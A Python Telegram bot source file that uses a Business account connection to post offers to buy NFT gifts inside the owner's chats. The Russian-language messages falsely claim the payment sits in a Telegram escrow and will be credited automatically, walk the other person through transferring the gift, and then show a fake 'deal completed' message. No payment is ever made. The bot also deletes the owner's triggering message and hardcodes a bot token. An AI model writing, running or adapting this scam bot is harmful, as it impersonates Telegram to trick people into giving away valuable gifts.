import asyncio, re, random, string, logging
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton,
    LinkPreviewOptions, BusinessConnection, CallbackQuery,
)
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = "8255516127:AAH3ADGmQ3CMEUCI4_IyzEmPvgVYcBESqAM"

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")

E_STAR = "6028338546736107668"
E_GEM = "5318901904686754959"
E_CHECK = "5774022692642492953"

BIZ_OWNERS: dict[str, dict] = {}
PENDING: dict[str, dict] = {}
GIFT_INDEX: dict[tuple, str] = {}


def em(i, f):
    return f'<tg-emoji emoji-id="{i}">{f}</tg-emoji>'


def parse_command(text):
    if not text:
        return None
    url_match = re.search(r"(https?://)?t\.me/nft/[A-Za-z]+-\d+", text)
    if not url_match:
        return None
    link = url_match.group(0)
    if not link.startswith("http"):
        link = "https://" + link

    rest = text.replace(url_match.group(0), "")
    num_match = re.search(r"\b(\d+)\b", rest)
    if not num_match:
        return None
    try:
        amount = int(num_match.group(1))
    except ValueError:
        return None

    currency = "GRAM" if re.search(r"\b(g|gram|грам|грамм)\b", rest.lower()) else "STARS"
    return link, amount, currency


def parse_gift(link):
    m = GIFT_RE.search(link)
    if not m:
        return None
    slug, num = m.group(1), m.group(2)
    name = re.sub(r"(?<!^)(?=[A-Z])", " ", slug)
    return name, num, slug


def amount_only(amount, currency):
    icon = em(E_GEM, "💎") if currency == "GRAM" else em(E_STAR, "⭐")
    return f'<b>{amount}</b> {icon}'


def build_offer_plain(amount, currency, gift_name, gift_num):
    return (
        f'Пользователь предлагает вам {amount_only(amount, currency)} '
        f'за подарок <b>{gift_name} #{gift_num}</b>.\n\n'
        f'Оффер действителен ещё <b>6 ч.</b>'
    )


def build_offer_linked(amount, currency, gift_name, gift_num, url):
    return (
        f'Пользователь предлагает вам {amount_only(amount, currency)} '
        f'за подарок <b><a href="{url}">{gift_name} #{gift_num}</a></b>.\n\n'
        f'Оффер действителен ещё <b>6 ч.</b>'
    )


def build_instruction(amount, currency, gift_name, gift_num, order_id, username, user_id, nft_url):
    rec = f"@{username}" if username else (
        f'<a href="tg://user?id={user_id}">id{user_id}</a>' if user_id else "—"
    )
    gift_link = f'<b><a href="{nft_url}">{gift_name} #{gift_num}</a></b>'
    return (
        f'<i>Ордер {order_id}</i>\n\n'
        f'Покупатель зарезервировал {amount_only(amount, currency)} через эскроу-систему Telegram. '
        f'Средства хранятся на специальном эскроу-счёте и будут автоматически зачислены на ваш баланс '
        f'Telegram Stars сразу после передачи подарка.\n\n'
        f'<b>Инструкция для завершения сделки:</b>\n'
        f'1. Передайте подарок пользователю: {rec}\n'
        f'2. Нажмите «Передать NFT» и выберите {gift_link}\n'
        f'3. Подтвердите передачу подарка.\n\n'
        f'Telegram зафиксирует транзакцию и моментально зачислит {amount_only(amount, currency)} '
        f'на ваш баланс. Резерв действует 24 часа.'
    )


def build_accepted(amount, currency, order_id):
    return (
        f'{em(E_CHECK, "✅")} <b>Сделка завершена!</b>\n\n'
        f'Ордер {order_id} выполнен.\n'
        f'{amount_only(amount, currency)} зачислено на баланс.'
    )


def kb_offer(order_id):
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="Отклонить", callback_data=f"decline:{order_id}"),
        InlineKeyboardButton(text="Принять", callback_data=f"accept:{order_id}"),
    ]])


def kb_instruction(order_id, username, user_id):
    if username:
        send_url = f"tg://send_gift?to={username}"
    elif user_id:
        send_url = f"tg://user?id={user_id}"
    else:
        send_url = "tg://settings"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Передать NFT ↗", url=send_url)],
        [InlineKeyboardButton(text="Подтвердить передачу", callback_data=f"confirm:{order_id}")],
    ])


def oid():
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))


def extract_gift_ref(message: Message):
    for attr in ("unique_gift", "gift"):
        obj = getattr(message, attr, None)
        if obj is None:
            continue
        g = getattr(obj, "gift", obj)
        name = getattr(g, "name", None) or getattr(g, "title", None)
        num = getattr(g, "number", None)
        if name and num is not None:
            slug = name.replace(" ", "")
            return slug, str(num)
    txt = (message.text or message.caption or "")
    m = GIFT_RE.search(txt)
    if m:
        return m.group(1), m.group(2)
    for ent_list in (message.entities or [], message.caption_entities or []):
        for ent in ent_list:
            url = getattr(ent, "url", None) or ""
            m = GIFT_RE.search(url)
            if m:
                return m.group(1), m.group(2)
    return None


async def mark_gift_transferred(message: Message, bcid: str):
    ref = extract_gift_ref(message)
    if not ref:
        return False
    slug, num = ref
    order_id = GIFT_INDEX.get((bcid, slug, num))
    if not order_id:
        return False
    meta = PENDING.get(order_id)
    if not meta:
        return False
    meta["gift_transferred"] = True
    return True


@dp.business_connection()
async def handle_business_connection(bc: BusinessConnection):
    user = bc.user
    if bc.is_enabled:
        BIZ_OWNERS[bc.id] = {"username": user.username, "user_id": user.id}
        logging.info(f"biz_conn ON: {bc.id} user={user.username}")
    else:
        BIZ_OWNERS.pop(bc.id, None)


@dp.business_message(F.text)
async def handle_business_message(message: Message):
    bcid = message.business_connection_id
    if not bcid:
        return

    if await mark_gift_transferred(message, bcid):
        return

    parsed = parse_command(message.text or "")
    if not parsed:
        return

    link, amount, currency = parsed
    gift = parse_gift(link)
    if not gift:
        return
    gift_name, gift_num, slug = gift

    info = BIZ_OWNERS.get(bcid)
    if not info:
        try:
            bc = await bot.get_business_connection(bcid)
            info = {"username": bc.user.username, "user_id": bc.user.id}
            BIZ_OWNERS[bcid] = info
        except Exception as e:
            logging.error(f"get_business_connection: {e}")
            return
    username = info.get("username")
    user_id = info.get("user_id")

    nft_url = f"https://t.me/nft/{slug}-{gift_num}"
    order_id = oid()

    # ШАГ 1: без ссылки
    try:
        sent = await bot.send_message(
            chat_id=message.chat.id,
            text=build_offer_plain(amount, currency, gift_name, gift_num),
            reply_markup=kb_offer(order_id),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except Exception as e:
        logging.error(f"send: {e}")
        return

    try:
        await bot.delete_business_messages(
            business_connection_id=bcid,
            message_ids=[message.message_id],
        )
    except Exception as e:
        logging.error(f"del: {e}")

    PENDING[order_id] = {
        "chat_id": message.chat.id,
        "msg_id": sent.message_id,
        "bcid": bcid,
        "amount": amount,
        "currency": currency,
        "gift_name": gift_name,
        "gift_num": gift_num,
        "gift_slug": slug,
        "nft_url": nft_url,
        "username": username,
        "user_id": user_id,
        "state": "OFFER",
        "gift_transferred": False,
    }
    GIFT_INDEX[(bcid, slug, gift_num)] = order_id

    # ШАГ 2: со ссылкой — для превью
    await asyncio.sleep(1.5)
    try:
        await bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=sent.message_id,
            text=build_offer_linked(amount, currency, gift_name, gift_num, nft_url),
            reply_markup=kb_offer(order_id),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True,
            ),
        )
    except TelegramBadRequest as e:
        logging.error(f"edit: {e}")


@dp.edited_business_message()
async def handle_edited_business(message: Message):
    bcid = message.business_connection_id
    if bcid:
        await mark_gift_transferred(message, bcid)


@dp.callback_query(F.data.startswith("decline:"))
async def on_decline(cb: CallbackQuery):
    order_id = cb.data.split(":", 1)[1]
    meta = PENDING.get(order_id)
    if not meta:
        await cb.answer()
        return
    try:
        await bot.edit_message_text(
            chat_id=meta["chat_id"],
            message_id=meta["msg_id"],
            text="❌ Оффер отклонён.",
            reply_markup=None,
            business_connection_id=meta["bcid"],
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except TelegramBadRequest as e:
        logging.error(f"decline: {e}")
    PENDING.pop(order_id, None)
    GIFT_INDEX.pop((meta["bcid"], meta["gift_slug"], meta["gift_num"]), None)
    await cb.answer()


@dp.callback_query(F.data.startswith("accept:"))
async def on_accept(cb: CallbackQuery):
    order_id = cb.data.split(":", 1)[1]
    meta = PENDING.get(order_id)
    if not meta:
        await cb.answer()
        return
    if meta["state"] == "INSTRUCTION":
        await cb.answer()
        return
    try:
        await bot.edit_message_text(
            chat_id=meta["chat_id"],
            message_id=meta["msg_id"],
            text=build_instruction(
                meta["amount"], meta["currency"],
                meta["gift_name"], meta["gift_num"],
                order_id,
                meta["username"], meta["user_id"],
                meta["nft_url"],
            ),
            reply_markup=kb_instruction(order_id, meta["username"], meta["user_id"]),
            business_connection_id=meta["bcid"],
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True,
            ),
        )
        meta["state"] = "INSTRUCTION"
    except TelegramBadRequest as e:
        logging.error(f"accept: {e}")
    await cb.answer()


@dp.callback_query(F.data.startswith("confirm:"))
async def on_confirm(cb: CallbackQuery):
    order_id = cb.data.split(":", 1)[1]
    meta = PENDING.get(order_id)
    if not meta:
        await cb.answer()
        return
    if not meta.get("gift_transferred"):
        await cb.answer(
            "❌ Ошибка: товар не получен. Попробуйте передать и подтвердить ещё раз.",
            show_alert=True,
        )
        return
    try:
        await bot.edit_message_text(
            chat_id=meta["chat_id"],
            message_id=meta["msg_id"],
            text=build_accepted(meta["amount"], meta["currency"], order_id),
            reply_markup=None,
            business_connection_id=meta["bcid"],
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except TelegramBadRequest as e:
        logging.error(f"confirm: {e}")
    PENDING.pop(order_id, None)
    GIFT_INDEX.pop((meta["bcid"], meta["gift_slug"], meta["gift_num"]), None)
    await cb.answer()


@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer(
        "🎁 Пришли ссылку на подарок и сумму, например:\n"
        "https://t.me/nft/SnoopDogg-103841 740\n"
        "или с GRAM: https://t.me/nft/SnoopDogg-103841 740 g"
    )


async def main():
    await dp.start_polling(
        bot,
        allowed_updates=[
            "business_connection",
            "business_message",
            "edited_business_message",
            "callback_query",
        ],
    )


if __name__ == "__main__":
    asyncio.run(main())
